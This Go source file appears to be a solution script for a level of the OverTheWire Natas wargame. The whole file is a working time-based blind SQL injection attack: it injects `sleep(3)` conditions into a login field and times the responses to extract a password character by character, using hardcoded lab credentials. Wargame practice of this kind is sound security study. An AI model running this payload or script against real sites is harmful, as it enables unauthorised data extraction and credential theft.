/**
Time Based sql injection
*/
package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

var (
	username = "natas17"
	password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
	url_     = "http://natas17.natas.labs.overthewire.org/"
	chars    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

func main() {
	password := ""
	for i := 0; i < 30; i++ {
		for _, c := range chars {
			if pentest(`natas18" and password LIKE BINARY"` + password + string(c) + `%" and sleep(3) #`) {
				password += string(c)
				fmt.Println(password)
			}
		}
	}

}
func pentest(payload string) bool {
	client := &http.Client{}
	postData := url.Values{}
	postData.Set("username", payload)
	req, err := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	req.SetBasicAuth(username, password)
	start := time.Now()
	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	_, err_ := ioutil.ReadAll(res.Body)
	if err_ != nil {
		log.Fatal(err)
	}
	//fmt.Printf("%s", payload)

	elapsed := time.Since(start).Seconds()
	//fmt.Println(elapsed)
	//fmt.Println(req)
	return elapsed > 3
}
